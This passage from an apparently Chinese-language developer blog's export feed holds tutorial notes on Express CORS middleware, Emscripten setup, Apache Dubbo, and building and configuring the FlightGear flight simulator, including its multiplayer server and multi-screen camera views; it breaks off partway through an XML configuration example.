<p>CORS标准描述了新的HTTP标头，它为浏览器提供了一种仅在获得许可时才能请求远程URL的方法。 尽管服务器可以执行某些验证和授权，但浏览器通常负责支持这些标头并遵守它们所施加的限制。</p>
<p>对于可以修改数据的Ajax和HTTP请求方法（通常是GET以外的HTTP方法，或者某些MIME类型的POST用法），规范要求浏览器“预检”请求，通过HTTP OPTIONS请求从服务器请求支持的方法 方法，然后，在服务器“批准”时，使用实际的HTTP请求方法发送实际请求。 服务器还可以通知客户端是否应该随请求一起发送“凭证”（包括Cookie和HTTP身份验证数据）。</p>
<p align="center">
    <img src="images/Flowchart_showing_Simple_and_Preflight_XHR.png" width="90%" alt="跨域资源共享流程图"/>
</p>
<center>图1 跨域资源共享流程图</center>

<h1 id="CORS安装"><a href="#CORS安装" class="headerlink" title="CORS安装"></a>CORS安装</h1><p>CORS是一个node.js包，用于提供Connect / Express中间件，可用于启用具有各种选项的CORS。使用如下方式安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install cors --save</span><br></pre></td></tr></table></figure>

<h1 id="CORS示例"><a href="#CORS示例" class="headerlink" title="CORS示例"></a>CORS示例</h1><ul>
<li>简单示例，允许所有跨域请求</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var express &#x3D; require(&#39;express&#39;)</span><br><span class="line">var cors &#x3D; require(&#39;cors&#39;)</span><br><span class="line">var app &#x3D; express()</span><br><span class="line"></span><br><span class="line">app.use(cors())</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;products&#x2F;:id&#39;, function (req, res, next) &#123;</span><br><span class="line">  res.json(&#123;msg: &#39;This is CORS-enabled for all origins!&#39;&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(80, function () &#123;</span><br><span class="line">  console.log(&#39;CORS-enabled web server listening on port 80&#39;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing" target="_blank" rel="noopener">Cross-origin resource sharing</a>,by wikipedia.</li>
<li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a>,by 阮一峰.</li>
<li><a href="https://expressjs.com/en/resources/middleware/cors.html" target="_blank" rel="noopener">cors</a>,by expressjs.com.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emscripten教程</title>
    <url>/2018/07/15/Emscripten%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>Emscripten是一种基于LLVM的编译器，理论上能够将任何能够生成LLVM位码的代码编译成javascript的严格子集asm.js，实际上主要用于将C/C++代码编译成asm.js。本文主要介绍Emscripten的安装过程。</p>
<h1 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h1><p>从源码编译安装十分麻烦，推荐安装核心的Emscripten SDK。以Windows为例，先使用如下命令下载emsdk。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Get the emsdk repo</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;juj&#x2F;emsdk.git</span><br><span class="line"></span><br><span class="line"># Enter that directory</span><br><span class="line">cd emsdk</span><br></pre></td></tr></table></figure>
<p>再使用如下命令安装配置Emscripten。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Fetch the latest registry of available tools.</span><br><span class="line">.\emsdk.bat update</span><br><span class="line"></span><br><span class="line"># Download and install the latest SDK tools. Need install Python first. </span><br><span class="line">.\emsdk.bat install latest</span><br><span class="line"></span><br><span class="line"># Make the &quot;latest&quot; SDK &quot;active&quot; for the current user. (writes ~&#x2F;.emscripten file)</span><br><span class="line">.\emsdk.bat activate latest</span><br><span class="line"></span><br><span class="line"># Activate PATH and other environment variables in the current terminal</span><br><span class="line">.\emsdk_env.bat</span><br></pre></td></tr></table></figure>

<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>使用如下命令验证Emscripten是否安装配置正确。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Enter that directory</span><br><span class="line">cd emsdk</span><br><span class="line"></span><br><span class="line"># Activate PATH and other environment variables in the current terminal</span><br><span class="line">.\emsdk_env.bat</span><br><span class="line"></span><br><span class="line"># Verifying Emscripten</span><br><span class="line">emcc.bat -v</span><br></pre></td></tr></table></figure>

<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>如果验证通过，即可使用Emscripten编译C/C++代码到asm.js。</p>
<p>创建名为helloWorld.cpp的文件，其内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  printf(&quot;hello, world!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如下命令编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">emcc.bat helloWorld.cpp</span><br></pre></td></tr></table></figure>
<p>编译后将生成a.out.js和a.out.wasm两个文件。后者是包含编译后代码的WebAssembly文件，前者是用于加载和执行后者的Javascipt文件。使用如下命令测试编译后生成的代码，将输出“hello,world!”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node a.out.js</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://kripken.github.io/emscripten-site/docs/introducing_emscripten/about_emscripten.html" target="_blank" rel="noopener">http://kripken.github.io/emscripten-site/docs/introducing_emscripten/about_emscripten.html</a>. by kripken.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Dubbo入门简介</title>
    <url>/2020/02/24/Dubbo%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Apache Dubbo |ˈdʌbəʊ| 是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。</p>
<h1 id="应用背景"><a href="#应用背景" class="headerlink" title="应用背景"></a>应用背景</h1><p>请参考<a href="http://dubbo.apache.org/zh-cn/docs/user/preface/background.html" target="_blank" rel="noopener">背景</a>.</p>
<h1 id="应用需求"><a href="#应用需求" class="headerlink" title="应用需求"></a>应用需求</h1><p>请参考<a href="http://dubbo.apache.org/zh-cn/docs/user/preface/requirements.html" target="_blank" rel="noopener">需求</a>.</p>
<h1 id="Dubbo架构"><a href="#Dubbo架构" class="headerlink" title="Dubbo架构"></a>Dubbo架构</h1><p>请参考<a href="http://dubbo.apache.org/zh-cn/docs/user/preface/architecture.html" target="_blank" rel="noopener">架构</a>.</p>
<h1 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h1><p>请参考<a href="http://dubbo.apache.org/zh-cn/docs/user/preface/usage.html" target="_blank" rel="noopener">应用</a>.</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://dubbo.apache.org/zh-cn/" target="_blank" rel="noopener">Apache Dubbo</a>,by apache.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear多人服务器的本地安装配置</title>
    <url>/2019/03/20/FlightGear%E5%A4%9A%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>FGMS或FlightGear多人游戏服务器是FlightGear的独立网络服务器，并根据GPL许可。 它允许通过FGFS内的网络与其他飞行员一起飞行。</p>
<p>FGMS服务器列表类型主要有：</p>
<ul>
<li>中继服务器 - 网络中的其他服务器。 每个都必须有完整的列表（减去自己）以获得适当的网络功能。</li>
<li>交叉馈送服务器 - 服务器从本地用户和其他服务器接收的所有内容都将转发到交叉馈送服务器。 用于在同一主机上运行多个连接的fgms实例，例如用于提供跟踪和未跟踪服务，而不会产生额外的外部流量。</li>
<li>跟踪服务器 - 服务器每10秒向跟踪器发送一个每个本地用户的摘要更新。</li>
<li>HUB服务器  - 通常服务器不会将从服务器接收的数据包发送到其他中继。 HUB服务器将数据从服务器发送到它知道的所有中继。</li>
</ul>
<p>特别呼号：</p>
<ul>
<li>“obsXXXX”（用您喜欢的任何字符替换X）允许连接的FlightGear客户端查看全球所有其他MP飞行员（位置数据和聊天消息），但对他们和MPmap保持不可见。</li>
<li>“mpdummy”阻止在FGTracker上跟踪飞行员。 不推荐 - 如果多个用户使用此呼号，服务器将忽略一些用户。 改为连接到未跟踪的服务器。</li>
</ul>
<h1 id="安装配置FGMS服务器"><a href="#安装配置FGMS服务器" class="headerlink" title="安装配置FGMS服务器"></a>安装配置FGMS服务器</h1><h2 id="下载FGMS服务器源码"><a href="#下载FGMS服务器源码" class="headerlink" title="下载FGMS服务器源码"></a>下载FGMS服务器源码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;fgms&#x2F;src fgms-src</span><br></pre></td></tr></table></figure>

<h2 id="安装配置FGMS服务器源码"><a href="#安装配置FGMS服务器源码" class="headerlink" title="安装配置FGMS服务器源码"></a>安装配置FGMS服务器源码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd fgms-src</span><br><span class="line">mkdir build</span><br><span class="line">cd build </span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line">cp contrib&#x2F;etc&#x2F;fgms_production.skel.conf build&#x2F;fgms.cfg</span><br><span class="line">cd build</span><br><span class="line">.&#x2F;fgms</span><br></pre></td></tr></table></figure>

<h1 id="安装配置FGMS跟踪服务器源码"><a href="#安装配置FGMS跟踪服务器源码" class="headerlink" title="安装配置FGMS跟踪服务器源码"></a>安装配置FGMS跟踪服务器源码</h1><h2 id="下载FGMS跟踪服务器源码"><a href="#下载FGMS跟踪服务器源码" class="headerlink" title="下载FGMS跟踪服务器源码"></a>下载FGMS跟踪服务器源码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;fgms&#x2F;fgtracker fgms-fgtracker</span><br></pre></td></tr></table></figure>

<h1 id="FlightGear联网飞行配置"><a href="#FlightGear联网飞行配置" class="headerlink" title="FlightGear联网飞行配置"></a>FlightGear联网飞行配置</h1><p>联机前，请选择合适的服务器名（通常是mpserver0?.flightgear.org）和端口号(通常是5000)，然后按照以下方式启动FlightGear。</p>
<h2 id="使用向导程序"><a href="#使用向导程序" class="headerlink" title="使用向导程序"></a>使用向导程序</h2><p>在向导程序上专门有一个联网飞行选项，只要选中选项，填入服务器名和端口号以及你的昵称就可以了，你的昵称最长可以使7个字符。同时必须确定AI models选项选中，否则无法看到别的联网飞机。</p>
<h2 id="使用命令行方式"><a href="#使用命令行方式" class="headerlink" title="使用命令行方式"></a>使用命令行方式</h2><p>基本命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--multiplay&#x3D;out,10,&lt;server&gt;,&lt;portnumber&gt;</span><br><span class="line">--multiplay&#x3D;in,10,&lt;client&gt;,&lt;portnumber&gt;</span><br><span class="line">--callsign&#x3D;&lt;anything&gt;</span><br><span class="line">--enable-ai-models</span><br></pre></td></tr></table></figure>

<p>备注:</p>
<ol>
<li><portnumber> 为端口号，比如5000.</li>
<li><server> 为服务器名，比如mpserver01.flightgear.org.</li>
<li><client> 是你的计算机名，或者是你的联网的IP地址，比如本地IP地址192.168.0.1</li>
<li><callsign> 是你自己的昵称, 最多7个字符比如NFGFS.<br>当程序开始运行后，你可以在服务器地图上看到自己，如果看不到，检查一下程序是否有报错信息，按照下面将要介绍的内容检查错误。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://wiki.flightgear.org/Howto:Multiplayer" target="_blank" rel="noopener">Howto:Multiplayer</a>,by flightgear home.</li>
<li><a href="http://wiki.flightgear.org/FlightGear_Multiplayer_Server" target="_blank" rel="noopener">FlightGear Multiplayer Server</a>,by flightgear home.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear在Windows的编译安装教程</title>
    <url>/2021/01/27/FlightGear%E5%9C%A8Windows%E7%9A%84%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>本文记录在Windows10平台上编译安装FlightGear的过程。</p>
<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><p>按顺序安装如下软件：</p>
<ol>
<li>CMake for Windows。</li>
<li>Microsoft Visual Studio 2017。</li>
<li>QT5.9.8。QT安装步骤请参考<a href="https://blog.csdn.net/qq_23473839/article/details/80523318" target="_blank" rel="noopener">QT5.11下载与安装教程</a>，<strong>注意需选择安装MSVC 2017 64-bit编译器</strong>。</li>
<li>Git。</li>
</ol>
<h1 id="获取源代码"><a href="#获取源代码" class="headerlink" title="获取源代码"></a>获取源代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;flightgear&#x2F;simgear simgear</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;flightgear&#x2F;flightgear flightgear</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;flightgear&#x2F;fgdata fgdata</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;flightgear&#x2F;windows-3rd-party windows-3rd-party</span><br><span class="line"></span><br><span class="line">git clone -b fgfs-342-1 https:&#x2F;&#x2F;github.com&#x2F;zakalawe&#x2F;osg.git osg</span><br></pre></td></tr></table></figure>

<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><p>采用如下目录结构组织源代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FlightGearBuild &#x2F; (Main root directory)</span><br><span class="line">    fgdata &#x2F; (FlightGear data files)</span><br><span class="line">    flightgear &#x2F; (FlightGear sources)</span><br><span class="line">    install &#x2F; (Directory where you will install the built binaries to)</span><br><span class="line">        launch.bat &#x2F; (launch script if desired, see below)</span><br><span class="line">    osg &#x2F; (OSG sources)</span><br><span class="line">    simgear &#x2F; (SimGear sources)</span><br><span class="line">    windows-3rd-party &#x2F;</span><br><span class="line">    build.bat &#x2F; (build script, see below)</span><br><span class="line">    update.bat &#x2F; (update script, see below)</span><br></pre></td></tr></table></figure>

<h1 id="编译链接"><a href="#编译链接" class="headerlink" title="编译链接"></a>编译链接</h1><p>使用build.bat批处理脚本配置编译OSG, SG 和 FG。其内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET PATH&#x3D;%PATH%;%ProgramFiles%\CMake\bin</span><br><span class="line">SET QT5SDK64&#x3D;C:\Qt\5.15.0\msvc2019_64</span><br><span class="line">SET CMAKE_TOOLCHAIN&#x3D;&quot;Visual Studio 16 2019&quot;</span><br><span class="line">SET ROOT_DIR&#x3D;C:\path\to\FlightGearBuild</span><br><span class="line"></span><br><span class="line">md osg-build</span><br><span class="line">md simgear-build</span><br><span class="line">md flightgear-build</span><br><span class="line"></span><br><span class="line">cd %ROOT_DIR%\osg-build</span><br><span class="line"></span><br><span class="line">cmake  %ROOT_DIR%\osg -G  %CMAKE_TOOLCHAIN% -A x64 ^</span><br><span class="line">                 -DACTUAL_3RDPARTY_DIR&#x3D;%ROOT_DIR%\windows-3rd-party&#x2F;msvc140&#x2F;3rdParty.x64 ^</span><br><span class="line">                 -DCMAKE_RELWITHDEBINFO_POSTFIX:STRING&#x3D; ^</span><br><span class="line">                 -DOSG_USE_UTF8_FILENAME:BOOL&#x3D;ON ^</span><br><span class="line">                 -DWIN32_USE_MP:BOOL&#x3D;ON ^</span><br><span class="line">                 -DCMAKE_INSTALL_PREFIX:PATH&#x3D;%ROOT_DIR%\install</span><br><span class="line">cmake --build . --config RelWithDebInfo --target INSTALL</span><br><span class="line"></span><br><span class="line">cd %ROOT_DIR%\simgear-build</span><br><span class="line">cmake  %ROOT_DIR%\simgear -G  %CMAKE_TOOLCHAIN% -A x64 ^</span><br><span class="line">                 -DOSG_FSTREAM_EXPORT_FIXED:BOOL&#x3D;ON ^</span><br><span class="line">                 -DCMAKE_INSTALL_PREFIX:PATH&#x3D;%ROOT_DIR%\install</span><br><span class="line">cmake --build . --config RelWithDebInfo --target INSTALL</span><br><span class="line"></span><br><span class="line">cd %ROOT_DIR%\flightgear-build</span><br><span class="line">cmake  %ROOT_DIR%\flightgear -G  %CMAKE_TOOLCHAIN% -A x64 ^</span><br><span class="line">                  -DCMAKE_INSTALL_PREFIX:PATH&#x3D;%ROOT_DIR%\install ^</span><br><span class="line">                  -DCMAKE_PREFIX_PATH&#x3D;%QT5SDK64% ^</span><br><span class="line">                  -DOSG_FSTREAM_EXPORT_FIXED:BOOL&#x3D;ON ^</span><br><span class="line">                  -DENABLE_COMPOSITOR:BOOL&#x3D;OFF</span><br><span class="line">                    </span><br><span class="line">cmake --build . --config RelWithDebInfo --target INSTALL</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<h1 id="启动FlightGear"><a href="#启动FlightGear" class="headerlink" title="启动FlightGear"></a>启动FlightGear</h1><p>构建launch.bat批处理文件，启动FlightGear，其内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET PATH&#x3D;C:\path\to\FlightGearBuild\install\bin;C:\path\to\FlightGearBuild\windows-3rd-party\msvc140\3rdParty.x64\bin;C:\Qt\5.15.0\msvc2019_64\bin;%PATH%</span><br><span class="line">fgfs.exe --launcher</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://wiki.flightgear.org/Building_using_CMake_-_Windows" target="_blank" rel="noopener">Building using CMake - Windows</a>,by flightgear.</li>
<li><a href="https://blog.csdn.net/inter_peng/article/details/53933206" target="_blank" rel="noopener">Visual Studio之RelWithDebInfo模式，“被忽视”的编译模式</a>,by inter_peng.</li>
<li><a href="https://blog.csdn.net/qq_23473839/article/details/80523318" target="_blank" rel="noopener">QT5.11下载与安装教程</a>,by 杨书航.</li>
<li><a href="https://zhuanlan.zhihu.com/p/58167219" target="_blank" rel="noopener">VS2017+Qt5.12环境搭建完美教程分享</a>,by 小豆君的干货铺.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear多屏多视口设置方法</title>
    <url>/2021/06/03/FlightGear%E5%A4%9A%E5%B1%8F%E5%A4%9A%E8%A7%86%E5%8F%A3%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在玩FlightGear的过程中，可能需要将视景分角度投影到不同显示器上，或者在一个显示器窗口上投影不同角度的视景。下面记录该需求实现方法。</p>
<h1 id="投影到不同显示器"><a href="#投影到不同显示器" class="headerlink" title="投影到不同显示器"></a>投影到不同显示器</h1><p>在FGDATA文件夹根目录下创建camera-views.xml文件夹，写入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;PropertyList&gt;</span><br><span class="line">  &lt;camera-group&gt;</span><br><span class="line">      &lt;window&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;host-name type&#x3D;&quot;string&quot;&gt;&lt;&#x2F;host-name&gt;</span><br><span class="line">        &lt;display&gt;0&lt;&#x2F;display&gt;</span><br><span class="line">        &lt;screen&gt;0&lt;&#x2F;screen&gt;</span><br><span class="line">        &lt;fullscreen type &#x3D; &quot;bool&quot;&gt;false&lt;&#x2F;fullscreen&gt;</span><br><span class="line">        &lt;decoration type &#x3D; &quot;bool&quot;&gt;false&lt;&#x2F;decoration&gt;</span><br><span class="line">        &lt;x&gt;0&lt;&#x2F;x&gt;</span><br><span class="line">        &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">        &lt;width&gt;1920&lt;&#x2F;width&gt;</span><br><span class="line">        &lt;height&gt;1080&lt;&#x2F;height&gt;</span><br><span class="line">      &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">      &lt;window&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Right&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;host-name type&#x3D;&quot;string&quot;&gt;&lt;&#x2F;host-name&gt;</span><br><span class="line">        &lt;display&gt;0&lt;&#x2F;display&gt;</span><br><span class="line">        &lt;screen&gt;1&lt;&#x2F;screen&gt;</span><br><span class="line">        &lt;fullscreen type &#x3D; &quot;bool&quot;&gt;false&lt;&#x2F;fullscreen&gt;</span><br><span class="line">        &lt;decoration type &#x3D; &quot;bool&quot;&gt;false&lt;&#x2F;decoration&gt;</span><br><span class="line">        &lt;x&gt;0&lt;&#x2F;x&gt;</span><br><span class="line">        &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">        &lt;width&gt;1280&lt;&#x2F;width&gt;</span><br><span class="line">        &lt;height&gt;720&lt;&#x2F;height&gt;</span><br><span class="line">      &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">      &lt;gui&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">          &lt;name type&#x3D;&quot;string&quot;&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line">      &lt;&#x2F;gui&gt;</span><br><span class="line"></span><br><span class="line">      &lt;camera&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">         &lt;name&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view&gt;</span><br><span class="line">          &lt;heading-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;heading-deg&gt;</span><br><span class="line">          &lt;roll-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;roll-deg&gt;</span><br><span class="line">          &lt;pitch-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;pitch-deg&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;viewport&gt;</span><br><span class="line">          &lt;x&gt;0&lt;&#x2F;x&gt;</span><br><span class="line">          &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">          &lt;width&gt;1920&lt;&#x2F;width&gt;</span><br><span class="line">          &lt;height&gt;1080&lt;&#x2F;height&gt;</span><br><span class="line">        &lt;&#x2F;viewport&gt;</span><br><span class="line">        </span><br><span class="line">      &lt;&#x2F;camera&gt;</span><br><span class="line">      &lt;camera&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Right&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">         &lt;name&gt;Right&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view&gt;</span><br><span class="line">          &lt;heading-deg type &#x3D; &quot;double&quot;&gt;-45.0&lt;&#x2F;heading-deg&gt;</span><br><span class="line">          &lt;roll-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;roll-deg&gt;</span><br><span class="line">          &lt;pitch-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;pitch-deg&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;viewport&gt;</span><br><span class="line">          &lt;x&gt;0&lt;&#x2F;x&gt;</span><br><span class="line">          &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">          &lt;width&gt;1280&lt;&#x2F;width&gt;</span><br><span class="line">          &lt;height&gt;720&lt;&#x2F;height&gt;</span><br><span class="line">        &lt;&#x2F;viewport&gt;</span><br><span class="line"></span><br><span class="line">      &lt;&#x2F;camera&gt;</span><br><span class="line">    &lt;&#x2F;camera-group&gt;</span><br><span class="line">&lt;&#x2F;PropertyList&gt;</span><br></pre></td></tr></table></figure>

<p>在FGDATA文件夹根目录下找到defaults.xml配置文件，修改如下配置内容，加入camera-views.xml配置文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;rendering include&#x3D;&quot;camera-views.xml&quot;&gt;</span><br><span class="line">&lt;&#x2F;rendering&gt;</span><br></pre></td></tr></table></figure>

<h1 id="投影到窗口不同地方"><a href="#投影到窗口不同地方" class="headerlink" title="投影到窗口不同地方"></a>投影到窗口不同地方</h1><p>在FGDATA文件夹根目录下创建camera-views.xml文件夹，写入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;PropertyList&gt;</span><br><span class="line">  &lt;camera-group&gt;</span><br><span class="line">      &lt;window&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;host-name type&#x3D;&quot;string&quot;&gt;&lt;&#x2F;host-name&gt;</span><br><span class="line">        &lt;display&gt;0&lt;&#x2F;display&gt;</span><br><span class="line">        &lt;screen&gt;0&lt;&#x2F;screen&gt;</span><br><span class="line">        &lt;fullscreen type &#x3D; &quot;bool&quot;&gt;false&lt;&#x2F;fullscreen&gt;</span><br><span class="line">        &lt;decoration type &#x3D; &quot;bool&quot;&gt;false&lt;&#x2F;decoration&gt;</span><br><span class="line">        &lt;x&gt;0&lt;&#x2F;x&gt;</span><br><span class="line">        &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">        &lt;width&gt;1920&lt;&#x2F;width&gt;</span><br><span class="line">        &lt;height&gt;1080&lt;&#x2F;height&gt;</span><br><span class="line">      &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">      &lt;gui&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">          &lt;name type&#x3D;&quot;string&quot;&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line">      &lt;&#x2F;gui&gt;</span><br><span class="line"></span><br><span class="line">      &lt;camera&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Main&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">          &lt;name&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view&gt;</span><br><span class="line">          &lt;heading-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;heading-deg&gt;</span><br><span class="line">          &lt;roll-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;roll-deg&gt;</span><br><span class="line">          &lt;pitch-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;pitch-deg&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;viewport&gt;</span><br><span class="line">          &lt;x&gt;0&lt;&#x2F;x&gt;</span><br><span class="line">          &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">          &lt;width&gt;1920&lt;&#x2F;width&gt;</span><br><span class="line">          &lt;height&gt;1080&lt;&#x2F;height&gt;</span><br><span class="line">        &lt;&#x2F;viewport&gt;</span><br><span class="line">        </span><br><span class="line">      &lt;&#x2F;camera&gt;</span><br><span class="line">      &lt;camera&gt;</span><br><span class="line">        &lt;name type&#x3D;&quot;string&quot;&gt;Left-Down&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;window&gt;</span><br><span class="line">          &lt;name&gt;Front&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;&#x2F;window&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view&gt;</span><br><span class="line">          &lt;heading-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;heading-deg&gt;</span><br><span class="line">          &lt;roll-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;roll-deg&gt;</span><br><span class="line">          &lt;pitch-deg type &#x3D; &quot;double&quot;&gt;0.0&lt;&#x2F;pitch-deg&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;viewport&gt;</span><br><span class="line">          &lt;x&gt;0&lt;&#x2F;x&gt;</span><br><span class="line">          &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">          &lt;width&gt;320&lt;&#x2F;width&gt;</span><br><span class="line">          &lt;height&gt;180&lt;&#x2F;height&gt;</span><br><span class="line">        &lt;&#x2F;viewport&gt;</span><br><span class="line"></span><br><span class="line">      